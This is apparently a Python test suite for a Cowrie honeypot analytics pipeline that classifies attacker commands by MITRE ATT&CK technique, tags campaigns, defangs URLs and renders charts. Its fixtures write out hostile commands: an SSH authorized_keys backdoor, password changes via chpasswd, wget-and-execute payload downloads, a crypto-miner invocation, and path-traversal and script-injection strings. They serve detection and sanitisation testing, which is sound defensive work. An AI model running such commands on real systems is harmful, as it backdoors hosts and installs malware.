import datetime as dt
import gzip
import importlib.util
import io
import json
import os
import tempfile
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path
from unittest import mock

from pipeline import __main__ as cli
from pipeline import demo, render, replays, stats, tty
from pipeline.attack import classify, technique_url
from pipeline.cowrie import SCHEMA, parse_networks, summarize
from pipeline.geo import GeoDB

FIXTURE = Path(__file__).parent / "fixtures" / "cowrie-3.1.json"   # recorded from a real Cowrie 3.1.2
ROOT = Path(__file__).resolve().parent.parent


def event(eventid, session="s1", ip="203.0.113.7", ts="2026-10-12T10:00:00.000000Z", **fields):
    return json.dumps({"eventid": eventid, "session": session, "src_ip": ip, "timestamp": ts,
                       "protocol": "ssh", "sensor": "test", **fields})


class AttackMappingTest(unittest.TestCase):
    def test_recon_and_persistence(self):
        found = classify([
            "uname -a; cat /proc/cpuinfo | grep name | wc -l",
            'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA mdrfckr">>.ssh/authorized_keys',
            'echo "root:x"|chpasswd|bash',
        ])
        self.assertTrue({"T1082", "T1098.004", "T1098", "T1070.004", "T1059.004"} <= found)

    def test_download_and_miner(self):
        found = classify(["cd /tmp; wget http://203.0.113.5/x; chmod +x x; ./x -o stratum+tcp://p:3333"])
        self.assertTrue({"T1105", "T1222.002", "T1496"} <= found)

    def test_wrappers_and_paths_are_unwrapped(self):
        self.assertIn("T1105", classify(["sudo /usr/bin/curl -O http://203.0.113.5/a"]))
        self.assertIn("T1057", classify(["HOME=/tmp busybox ps"]))

    def test_harmless_input_maps_to_nothing(self):
        self.assertEqual(classify(["echo hello", "exit", ""]), set())

    def test_technique_url(self):
        self.assertEqual(technique_url("T1098.004"), "https://attack.mitre.org/techniques/T1098/004/")


class SummarizeTest(unittest.TestCase):
    def test_real_cowrie_log(self):
        day = summarize(FIXTURE.read_text().splitlines(), "2026-10-13")
        t = day["totals"]
        self.assertEqual((t["sessions"], t["login_attempts"], t["login_success"]), (7, 7, 5))
        self.assertEqual(day["protocols"], {"ssh": 6, "telnet": 1})
        self.assertEqual(day["unique_ips"], 1)
        self.assertEqual(t["downloads"], 1)
        self.assertEqual(day["downloads"][0]["url"], "http://example.com/index.html")
        self.assertIn(["SSH-2.0-OpenSSH_10.0", 6], day["clients"])
        self.assertEqual(day["techniques"]["T1110.001"], 7)
        self.assertEqual(sum(day["hourly"]), 7)

    def test_per_ip_counters_and_credentials(self):
        lines = [
            event("cowrie.session.connect"),
            event("cowrie.login.failed", username="root", password="root"),
            event("cowrie.login.success", username="root", password="1234"),
            event("cowrie.command.input", input="  uname -a "),
            event("cowrie.session.connect", session="s2", ip="198.51.100.1", ts="2026-10-12T23:59:59Z"),
            "not json",
            json.dumps(["not", "an", "object"]),
        ]
        day = summarize(lines, "2026-10-12")
        self.assertEqual(day["ips"]["203.0.113.7"], [1, 2, 1, 1])
        self.assertEqual(day["credentials"][0][2], 1)
        self.assertIn(["uname -a", 1], day["commands"])
        self.assertEqual(day["hourly"][10], 1)
        self.assertEqual(day["hourly"][23], 1)
        self.assertEqual(day["totals"]["malformed_lines"], 1)
        self.assertEqual(day["totals"]["interactive_sessions"], 1)

    def test_operator_ips_are_dropped(self):
        lines = [event("cowrie.session.connect"),
                 event("cowrie.login.failed", username="root", password="root"),
                 event("cowrie.session.connect", session="s2", ip="198.51.100.9"),
                 event("cowrie.session.connect", session="s3", ip="2001:db8::5")]
        day = summarize(lines, "2026-10-12", parse_networks(" 203.0.113.7, 198.51.100.0/24\n2001:db8::/32 "))
        self.assertEqual((day["totals"]["sessions"], day["unique_ips"], day["ips"]), (0, 0, {}))
        self.assertEqual(day["usernames"], [])
        self.assertEqual(summarize(lines, "2026-10-12", parse_networks(""))["unique_ips"], 3)
        with self.assertRaisesRegex(ValueError, "not an IP") as caught:
            parse_networks("203.0.113.7,secret-host")
        self.assertNotIn("secret-host", str(caught.exception))

    def test_attacker_strings_are_bounded(self):
        day = summarize([event("cowrie.command.input", input="A" * 10_000 + "\x00")], "2026-10-12")
        self.assertEqual(len(day["commands"][0][0]), 500)


class StatsTest(unittest.TestCase):
    def days(self, n, sessions=10):
        start = dt.date(2026, 9, 1)
        out = []
        for i in range(n):
            date = (start + dt.timedelta(days=i)).isoformat()
            lines = [event("cowrie.session.connect", session=f"{date}-{k}", ip=f"203.0.113.{k}",
                           ts=f"{date}T05:00:00Z") for k in range(sessions)]
            out.append(summarize(lines, date))
        return out

    def test_windows_and_previous_period(self):
        result = stats.build(self.days(20), GeoDB(), now=dt.datetime(2026, 9, 21, tzinfo=dt.timezone.utc))
        w7, w30, wall = (result["windows"][k] for k in ("7d", "30d", "all"))
        self.assertEqual((w7["days"], w7["totals"]["sessions"]), (7, 70))
        self.assertEqual(w7["previous"]["sessions"], 70)
        self.assertIsNone(w30["previous"])          # no full 30 days before the window
        self.assertEqual(wall["totals"]["unique_ips"], 10)
        self.assertEqual(sum(map(sum, wall["heatmap"])), 200)
        self.assertEqual(result["sensor"]["first_day"], "2026-09-01")

    def test_gaps_are_zero_filled(self):
        days = self.days(5)
        del days[2]
        daily = stats.build(days, GeoDB())["windows"]["all"]["daily"]
        self.assertEqual([d["sessions"] for d in daily], [10, 10, 0, 10, 10])

    def test_empty(self):
        self.assertEqual(stats.build([], GeoDB())["windows"], {})

    def test_defang(self):
        self.assertEqual(stats.defang("http://203.0.113.5/bins.sh"), "hxxp://203[.]0[.]113[.]5/bins.sh")
        self.assertEqual(stats.defang("https://evil.example/a.b"), "hxxps://evil[.]example/a.b")
        self.assertEqual(stats.defang("x.sh"), "x[.]sh")


class RenderTest(unittest.TestCase):
    NASTY = ['<script>alert(1)</script>', 'a|b`c``d', '\x1b[31mred\x07', '', '&amp; "quoted"', '\ud800']

    def test_svg_is_well_formed_with_hostile_labels(self):
        doc = render.bar_chart([(s, i + 1) for i, s in enumerate(self.NASTY)], "t", mono=True)
        root = ET.fromstring(doc)
        texts = "".join(root.itertext())
        self.assertIn("<script>", texts)               # shown as text...
        self.assertEqual(root.findall(".//{http://www.w3.org/2000/svg}script"), [])  # ...never as markup
        self.assertIn("\\x1b", texts)

    def test_area_chart_is_well_formed(self):
        ET.fromstring(render.area_chart([("2026-10-01", 5), ("2026-10-02", 1500)], "t"))
        ET.fromstring(render.area_chart([], "t"))

    def test_markdown_code_spans(self):
        self.assertEqual(render.md_code("a|b"), "`a\\|b`")
        self.assertEqual(render.md_code("x`y"), "``x`y``")
        self.assertEqual(render.md_code("`edge"), "`` `edge ``")
        self.assertEqual(render.md_code(""), "*(empty)*")
        self.assertNotIn("\n", render.md_code("line1\nline2"))

    def test_compact_and_ticks(self):
        self.assertEqual([render.compact(n) for n in (999, 1000, 1284, 12_900_000)], ["999", "1K", "1.3K", "12.9M"])
        self.assertEqual(render.nice_ticks(1234), [0, 500, 1000, 1500])

    def test_readme_block_replaced_between_markers(self):
        with tempfile.TemporaryDirectory() as tmp:
            readme = Path(tmp) / "README.md"
            readme.write_text(f"intro\n{render.START}\nold\n{render.END}\noutro\n")
            self.assertTrue(render.update_readme(readme, "new"))
            self.assertEqual(readme.read_text(), f"intro\n{render.START}\nnew\n{render.END}\noutro\n")


def session(sid, ip="203.0.113.7", ts="2026-10-12T10:00:00.000000Z", commands=(), tty_sha=None, duration=1000,
            password="1234", protocol="telnet", downloads=(), failed=()):
    """Event lines of one complete session that logged in and ran `commands`."""
    lines = [event("cowrie.session.connect", session=sid, ip=ip, ts=ts, protocol=protocol),
             event("cowrie.login.success", session=sid, ip=ip, ts=ts, username="root", password=password)]
    lines += [event("cowrie.command.input", session=sid, ip=ip, ts=ts, input=c) for c in commands]
    lines += [event("cowrie.session.file_download", session=sid, ip=ip, ts=ts, url=u, shasum=sha) for u, sha in downloads]
    lines += [event("cowrie.session.file_download.failed", session=sid, ip=ip, ts=ts, url=u) for u in failed]
    if tty_sha:
        lines.append(event("cowrie.log.closed", session=sid, ip=ip, ts=ts, shasum=tty_sha, size=100,
                           ttylog="var/lib/cowrie/tty/" + tty_sha, duration_ms=duration))
    lines.append(event("cowrie.session.closed", session=sid, ip=ip, ts=ts, duration_ms=duration))
    return lines


MIRAI = ["enable", "system", "shell", "sh", "/bin/busybox HISILICON"]


class FakeGeo:
    """Country by first octet, so drill-downs have something to group by."""
    TABLE = {"203": ("PK", 9541, "CYBERNET-AP"), "198": ("KR", 4766, "KIXS-AS-KR"), "192": ("US", 14061, "DIGITALOCEAN")}

    def lookup(self, ip):
        return self.TABLE.get(ip.split(".")[0], ("??", 0, "Unknown"))


class SummarizeV2Test(unittest.TestCase):
    def test_real_log_v2_fields(self):
        day = summarize(FIXTURE.read_text().splitlines(), "2026-10-13")
        self.assertEqual(day["schema"], SCHEMA)
        self.assertEqual(sum(c["sessions"] for c in day["campaigns"].values()), day["totals"]["interactive_sessions"])
        self.assertEqual(len(day["replays"]), 4)
        self.assertTrue(all(len(r["sha"]) == 64 for r in day["replays"]))
        rec = day["records"]
        self.assertEqual((rec["longest_session"]["duration_ms"], rec["longest_session"]["session"]), (3044, "9dbb4a73377a"))
        self.assertEqual(rec["most_commands"]["commands"], 4)
        self.assertEqual(rec["most_attempts_ip"], {"attempts": 7, "ip": "127.0.0.1"})
        profile = day["profiles"]["127.0.0.1"]
        self.assertEqual(sum(profile["campaigns"].values()), day["totals"]["interactive_sessions"])
        self.assertEqual(len(profile["replays"]), 4)
        self.assertEqual(day["downloads"][0]["ips"], ["127.0.0.1"])
        self.assertEqual(len(day["downloads"][0]["campaigns"]), 1)
        self.assertEqual(day["failed_downloads"], [])

    def test_campaigns_and_replay_candidates(self):
        lines = []
        for i in range(5):
            lines += session(f"m{i}", ip=f"203.0.113.{i}", commands=MIRAI[: 2 + i], tty_sha=f"{i:x}" * 64)
        lines += session("u1", ip="198.51.100.1", commands=["uname -a"], tty_sha="a" * 64, duration=90_000)
        lines += session("u2", ip="198.51.100.2", commands=["uname -a"], tty_sha="a" * 64)   # same recording
        lines += session("e1", ip="198.51.100.3", tty_sha="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
        day = summarize(lines, "2026-10-12")
        mirai = day["campaigns"]["mirai-hisilicon"]
        self.assertEqual((mirai["sessions"], len(mirai["ips"]), mirai["known"]), (2, 2, True))   # m3, m4 reach the tag
        self.assertEqual(mirai["commands"], MIRAI)
        self.assertIn("T1110.001", mirai["techniques"])
        shas = [r["sha"] for r in day["replays"]]
        self.assertEqual(len(shas), len(set(shas)))
        self.assertIn("a" * 64, shas)                        # longest session
        self.assertIn("4" * 64, shas)                        # most commands
        self.assertNotIn("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", shas)
        self.assertEqual(day["records"]["longest_session"]["session"], "u1")
        self.assertLessEqual(sum(1 for r in day["replays"] if r["campaign"] == "mirai-hisilicon"), 2)

    def test_hostile_input_is_bounded(self):
        huge = "<script>" + "A" * 10_000 + "\x00"
        lines = session("h1", commands=[huge] * 40, password="p" * 5000, failed=["http://" + "x" * 1000])
        lines.append(event("cowrie.log.closed", session="h1", shasum="../../etc/passwd", size=1))
        lines.append(event("cowrie.session.closed", session="h1", duration_ms="soon"))
        day = summarize(lines, "2026-10-12")
        camp = next(iter(day["campaigns"].values()))
        self.assertEqual(len(camp["commands"]), 25)
        self.assertTrue(all(len(c) <= 300 for c in camp["commands"]))
        self.assertTrue(len(camp["name"]) <= 60)
        self.assertEqual(day["replays"], [])
        self.assertEqual(day["records"]["longest_password"]["length"], 5000)
        self.assertEqual(len(day["records"]["longest_password"]["password"]), 120)
        profile = day["profiles"]["203.0.113.7"]
        self.assertTrue(all(len(c) <= 300 for c, _n in profile["commands"]))
        self.assertTrue(all(len(u) <= 300 and len(p) <= 300 for u, p, _n in profile["credentials"]))
        self.assertEqual(len(day["failed_downloads"][0][0]), 300)

    def test_ignored_ips_leave_no_trace(self):
        lines = session("s1", commands=MIRAI, tty_sha="1" * 64) + session("s2", ip="198.51.100.9", commands=["id"])
        day = summarize(lines, "2026-10-12", parse_networks("203.0.113.0/24"))
        self.assertEqual(list(day["profiles"]), ["198.51.100.9"])
        self.assertNotIn("mirai-hisilicon", day["campaigns"])
        self.assertEqual(day["replays"], [])
        self.assertNotIn("203.0.113.7", json.dumps(day))


def make_days(n=10, start=dt.date(2026, 10, 1)):
    days = []
    for i in range(n):
        date = (start + dt.timedelta(days=i)).isoformat()
        ts = f"{date}T05:00:00.000000Z"
        lines = session(f"{date}-a", ip="203.0.113.1", ts=ts, commands=MIRAI, tty_sha=f"{i:02x}" * 32,
                        downloads=[("http://203.0.113.5/bins.sh", "b" * 64)])
        lines += session(f"{date}-s", ip=f"192.0.2.{i}", ts=ts)
        if i >= n - 2:                                 # a campaign that only showed up lately
            lines += session(f"{date}-x", ip="198.51.100.4", ts=ts, commands=["./x -o stratum+tcp://p:1"],
                             tty_sha=f"f{i:x}" * 32, duration=99_000, failed=["http://192.0.2.9/arm7"])
        days.append(summarize(lines, date))
    return days


MALWARE = {
    "b" * 64: {"kind": "script", "size": 120, "script": {"urls": ["http://203.0.113.5/bins/arm7", 5], "archs": ["arm7", "Bad Token!"]},
               "hints": ["mirai", "<b>"], "intel": {"vt": {"malicious": 40, "total": 70, "label": "trojan\x1b[31m"},
                                                    "mb": None, "sources": {"vt": "x"}}},
}


class StatsV2Test(unittest.TestCase):
    NOW = dt.datetime(2026, 10, 11, tzinfo=dt.timezone.utc)

    def build(self, days=None, replay_ids=None, malware=None):
        return stats.build(days or make_days(), FakeGeo(), now=self.NOW, malware=malware or MALWARE,
                           replay_ids=replay_ids)

    def test_campaign_windows_and_new_flag(self):
        result = self.build()
        w7, wall = result["windows"]["7d"], result["windows"]["all"]
        self.assertEqual(result["schema"], 2)
        by_id = {c["id"]: c for c in w7["campaigns"]}
        self.assertEqual(by_id["mirai-hisilicon"]["sessions"], 7)
        self.assertFalse(by_id["mirai-hisilicon"]["new"])
        self.assertTrue(by_id["xmrig-miner"]["new"])
        self.assertFalse(any(c["new"] for c in wall["campaigns"]))
        self.assertEqual(by_id["mirai-hisilicon"]["countries"], [["PK", 7]])
        self.assertEqual(by_id["mirai-hisilicon"]["downloads"], ["b" * 64])

    def test_only_existing_replays_are_linked(self):
        latest = "09" * 8
        result = self.build(replay_ids={latest, "zz", "f" * 16})
        w = result["windows"]["all"]
        self.assertEqual([r["id"] for r in w["replays"]], [latest])
        self.assertEqual(w["replays"][0]["campaign_name"], "Mirai-style loader (HISILICON)")
        self.assertEqual(w["replays"][0]["cc"], "PK")
        camps = {c["id"]: c for c in w["campaigns"]}
        self.assertEqual(camps["mirai-hisilicon"]["replay"], latest)
        self.assertIsNone(camps["xmrig-miner"]["replay"])
        self.assertEqual(self.build()["windows"]["all"]["replays"], [])

    def test_records(self):
        w = self.build()["windows"]["all"]
        r = w["records"]
        self.assertEqual(r["longest_session"]["duration_ms"], 99_000)
        self.assertEqual(r["longest_session"]["ip"], "198.51.100.4")
        self.assertIn("replay", r["longest_session"])
        self.assertEqual(r["most_attempts_ip"], {"attempts": 10, "ip": "203.0.113.1"})
        self.assertEqual(r["most_persistent_ip"], {"days": 10, "ip": "203.0.113.1"})
        self.assertEqual(r["longest_password"]["password"], "1234")

    def test_country_drilldown(self):
        countries = {c["cc"]: c for c in self.build()["windows"]["all"]["countries"]}
        self.assertEqual(countries["PK"]["top_ips"], ["203.0.113.1"])
        self.assertEqual(countries["PK"]["asns"], [[9541, "CYBERNET-AP", 10]])
        self.assertEqual(countries["PK"]["campaigns"], [["mirai-hisilicon", 10]])
        self.assertEqual(len(countries["US"]["top_ips"]), 5)

    def test_malware_merge(self):
        w = self.build()["windows"]["all"]
        d = w["downloads"][0]
        self.assertEqual((d["ips"], d["top_ips"], d["campaigns"]), (1, ["203.0.113.1"], ["mirai-hisilicon"]))
        meta = d["meta"]
        self.assertEqual(meta["script_urls"], ["hxxp://203[.]0[.]113[.]5/bins/arm7"])
        self.assertEqual((meta["script_archs"], meta["hints"]), (["arm7"], ["mirai"]))
        self.assertEqual(d["intel"]["vt"]["malicious"], 40)
        self.assertTrue(d["intel"]["vt"]["label"].isprintable())
        self.assertIsNone(d["intel"]["mb"])
        self.assertEqual(w["malware_arch"], [["Shell script", 1]])
        self.assertEqual(w["failed_downloads"], [["hxxp://192[.]0[.]2[.]9/arm7", 2]])
        self.assertIsNone(self.build(malware={"x": {}})["windows"]["all"]["downloads"][0]["meta"])

    def test_type_labels(self):
        self.assertEqual(stats.type_label({"kind": "elf", "elf": {"machine": "ARM", "bits": 32, "endian": "little"}}),
                         "ARM 32-bit LE")
        self.assertEqual(stats.type_label({"kind": "elf", "elf": {"machine": None, "bits": 32, "endian": "big",
                                                                  "machine_id": None, "static": None}}), "ELF 32-bit BE")
        self.assertEqual(stats.type_label({"kind": "elf", "elf": {"machine": None, "bits": None, "endian": None}}),
                         "ELF (truncated)")
        self.assertEqual(stats.type_label({"kind": "empty"}), "Empty file")
        self.assertEqual(stats.type_label({"kind": "nonsense"}), "Other")
        self.assertEqual(stats.malware_view({"kind": "evil", "size": -1})["kind"], "data")
        self.assertIsNone(stats.intel_view({"intel": {"vt": {"malicious": "41"}, "mb": "x"}}))

    def test_schema_1_days_still_build(self):
        days = make_days(3)
        for day in days:
            for key in ("campaigns", "replays", "records", "profiles", "failed_downloads"):
                del day[key]
            for d in day["downloads"]:
                del d["ips"], d["campaigns"]
            day["schema"] = 1
        result = stats.build(days, FakeGeo(), now=self.NOW)
        self.assertEqual(result["windows"]["all"]["campaigns"], [])
        self.assertEqual(result["windows"]["all"]["records"]["most_persistent_ip"]["days"], 3)
        self.assertEqual(len(stats.build_profiles(days, FakeGeo(), now=self.NOW)["ips"]), 5)

    def test_deterministic(self):
        a = json.dumps(self.build(replay_ids={"09" * 8}), sort_keys=True)
        b = json.dumps(self.build(replay_ids={"09" * 8}), sort_keys=True)
        self.assertEqual(a, b)


class ProfilesTest(unittest.TestCase):
    def test_profile_fields(self):
        days = make_days(40, start=dt.date(2026, 9, 1))
        out = stats.build_profiles(days, FakeGeo(), replay_ids={"27" * 8}, now=StatsV2Test.NOW)
        p = out["ips"]["203.0.113.1"]
        self.assertEqual((p["days_active"], p["sessions"], p["cc"]), (40, 40, "PK"))
        self.assertEqual(len(p["daily"]), 30)                   # last 30 days only
        self.assertEqual(p["campaigns"], [["mirai-hisilicon", 40]])
        self.assertEqual(p["credentials"], [["root", "1234", 40]])
        self.assertEqual(p["replays"], ["27" * 8])
        self.assertEqual(p["first"][:10], "2026-09-01")
        self.assertNotIn("192.0.2.0", out["ips"])                # last seen 40 days ago
        self.assertIn("top_commands", p)

    def test_urls_in_published_commands_are_defanged(self):
        cmd = "cd /tmp; wget http://203.0.113.5/x.sh; sh x.sh"
        day = summarize([event("cowrie.session.connect", ts="2026-10-12T10:00:00Z"),
                         event("cowrie.login.success", username="root", password="x", ts="2026-10-12T10:00:01Z"),
                         event("cowrie.command.input", input=cmd, ts="2026-10-12T10:00:02Z")], "2026-10-12")
        published = json.dumps([stats.build([day], FakeGeo(), now=StatsV2Test.NOW),
                                stats.build_profiles([day], FakeGeo(), now=StatsV2Test.NOW)])
        self.assertNotIn("http://", published)
        self.assertIn("hxxp://203[.]0[.]113[.]5/x.sh", published)


class ReplaySelectionTest(unittest.TestCase):
    def test_select_sync_prune(self):
        days = make_days()
        chosen = replays.select(days)
        ids = [c["id"] for c in chosen]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertIn("09" * 8, ids)                             # best mirai replay: latest of equals
        self.assertIn("f9" * 8, ids)                             # longest session
        self.assertLessEqual(len(replays.select(days, max_files=1)), 1)
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "replays"
            data = tty.encode([(tty.OP_OPEN, 0, 1.0, b""), (tty.OP_WRITE, 2, 1.5, b"$ hi\\r\\n")])
            written = replays.sync(days, lambda sha: data if sha.startswith("09") else None, out, log=lambda m: None)
            self.assertEqual(sorted(written), sorted(i for i in ids if i.startswith("09")))
            self.assertEqual(replays.sync(days, lambda sha: data, out, log=lambda m: None),
                             [i for i in ids if not i.startswith("09")])
            (out / "0123456789abcdef.json").write_text("{}")
            (out / "../evil.json").write_text("{}")
            (out / "notes.txt").write_text("keep")
            self.assertEqual(replays.prune(out, set(ids)), 1)
            self.assertEqual(replays.existing(out), set(ids))
            self.assertTrue((out / "notes.txt").exists())
            r = json.loads((out / f"{ids[0]}.json").read_text())
            self.assertEqual(r["frames"], [[0.5, "$ hi\\r\\n"]])


class FakeContainer:
    def __init__(self, blobs):
        self.blobs = blobs          # name -> (etag, bytes)
        self.downloads = []

    def list(self, prefix):
        return [{"name": n, "etag": e, "size": len(b)} for n, (e, b) in sorted(self.blobs.items()) if n.startswith(prefix)]

    def download(self, name):
        self.downloads.append(name)
        return self.blobs[name][1]

    def get(self, name):
        return self.download(name) if name in self.blobs else None


class FetchTest(unittest.TestCase):
    def test_fetch_all(self):
        tty_sha = "f0b8934851fbc37c0a0c2826aaf85eff5546674308660c6f38ddb4e1b1a3784a"     # in the fixture
        meta_sha = "25ddf2c883e0d1958ea971d279a7e4f0fd446724ee3db7db19dadabd4a62e484"
        recording = tty.encode([(tty.OP_OPEN, 0, 1.0, b""), (tty.OP_WRITE, 2, 1.1, b"hello")])
        container = FakeContainer({
            "cowrie/2026-10-13.json.gz": ("e1", gzip.compress(FIXTURE.read_bytes())),
            "cowrie/notes.txt": ("e0", b"x"),
            f"malware/{meta_sha}.json": ("m1", json.dumps({"kind": "text", "intel": None}).encode()),
            "malware/../../x.json": ("m2", b"{}"),
            f"tty/{tty_sha}": ("t1", recording),
        })
        with tempfile.TemporaryDirectory() as tmp, mock.patch("builtins.print"):
            tmp = Path(tmp)
            dirs = dict(daily_dir=tmp / "daily", state_path=tmp / "state.json", malware_dir=tmp / "malware",
                        replay_dir=tmp / "replays")
            cli.fetch_all(container, **dirs)
            self.assertEqual(json.loads((tmp / "daily" / "2026-10-13.json").read_text())["schema"], SCHEMA)
            self.assertEqual(json.loads((tmp / "malware" / f"{meta_sha}.json").read_text())["sha256"], meta_sha)
            self.assertEqual(sorted(p.name for p in (tmp / "malware").iterdir()), [f"{meta_sha}.json"])
            self.assertTrue((tmp / "replays" / f"{tty_sha[:16]}.json").exists())

            # Nothing changed: nothing is downloaded again.
            container.downloads.clear()
            cli.fetch_all(container, **dirs)
            self.assertEqual(container.downloads, [])

            # Intel added locally survives a re-upload of the metadata; an old summary schema is redone.
            meta_path = tmp / "malware" / f"{meta_sha}.json"
            meta_path.write_text(json.dumps({"kind": "text", "intel": {"vt": None, "mb": {"signature": "X"}}}))
            container.blobs[f"malware/{meta_sha}.json"] = ("m3", json.dumps({"kind": "text", "intel": None}).encode())
            day_path = tmp / "daily" / "2026-10-13.json"
            day_path.write_text(json.dumps({**json.loads(day_path.read_text()), "schema": 1}))
            cli.fetch_all(container, **dirs)
            self.assertEqual(json.loads(meta_path.read_text())["intel"]["mb"]["signature"], "X")
            self.assertEqual(json.loads(day_path.read_text())["schema"], SCHEMA)
            self.assertIn("cowrie/2026-10-13.json.gz", container.downloads)


class DemoTest(unittest.TestCase):
    def test_demo_feeds_every_new_card(self):
        with tempfile.TemporaryDirectory() as tmp, mock.patch("builtins.print"):
            tmp = Path(tmp)
            paths = demo.generate(tmp / "raw", days=4, seed=3, today=dt.date(2026, 10, 14))
            days = [summarize(p.read_text().splitlines(), p.name[-10:]) for p in paths]
            replays.sync(days, replays.local_fetcher(tmp / "raw" / "tty"), tmp / "out" / "replays", log=lambda m: None)
            data = cli.publish(days, stats.load_malware(tmp / "raw" / "malware"), tmp / "out",
                               replay_dir=tmp / "out" / "replays", geo_db=GeoDB(), charts_dir=tmp / "charts",
                               readme=None, demo_mode=True, now=StatsV2Test.NOW)
            w = data["windows"]["all"]
            for key in ("campaigns", "replays", "downloads", "malware_arch", "failed_downloads"):
                self.assertTrue(w[key], key)
            self.assertTrue(any(c["known"] for c in w["campaigns"]))
            self.assertTrue(any(d["meta"] and d["intel"] for d in w["downloads"]))
            self.assertTrue(all(w["records"].values()))
            for row in w["replays"]:
                replay = json.loads((tmp / "out" / "replays" / f"{row['id']}.json").read_text())
                self.assertFalse(any("http://" in f[1] for f in replay["frames"]))
            profiles = json.loads((tmp / "out" / "profiles.json").read_text())
            self.assertTrue(profiles["ips"])
            self.assertLess((tmp / "out" / "stats.json").stat().st_size, 400 * 1024)


class ShipperTest(unittest.TestCase):
    def load_shipper(self, env):
        with mock.patch.dict(os.environ, env):
            spec = importlib.util.spec_from_file_location("shipper", ROOT / "sensor" / "shipper.py")
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
        return module

    def test_dry_run_ships_each_day_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp = Path(tmp)
            logs = tmp / "var" / "log" / "cowrie"
            logs.mkdir(parents=True)
            (logs / "cowrie.json.2026-10-11").write_text(FIXTURE.read_text())
            (logs / "cowrie.json").write_text(FIXTURE.read_text())
            shipper = self.load_shipper({"COWRIE_VAR": str(tmp / "var"), "STATE_DIRECTORY": str(tmp / "state"),
                                         "SHIPPER_DRY_RUN_DIR": str(tmp / "blobs")})
            with mock.patch("builtins.print"):
                self.assertEqual(shipper.main(), 0)
            blob = tmp / "blobs" / "cowrie" / "2026-10-11.json.gz"
            self.assertTrue(blob.exists())
            import gzip
            self.assertEqual(gzip.decompress(blob.read_bytes()).decode(), FIXTURE.read_text())
            with mock.patch("builtins.print") as printed:
                shipper.main()
            self.assertFalse(any("uploaded" in str(c) for c in printed.call_args_list))


if __name__ == "__main__":
    unittest.main()
